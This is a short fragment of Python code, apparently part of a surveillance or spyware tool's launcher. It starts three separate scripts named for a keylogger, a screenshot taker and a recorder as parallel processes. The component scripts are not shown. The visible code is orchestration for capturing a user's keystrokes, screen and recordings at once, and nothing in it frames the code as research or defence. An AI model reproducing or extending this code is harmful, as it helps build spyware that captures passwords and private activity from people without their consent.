...
processes.append(subprocess.Popen([sys.executable, keylogger_script]))
processes.append(subprocess.Popen([sys.executable, screenshot_script]))
processes.append(subprocess.Popen([sys.executable, recording_script]))
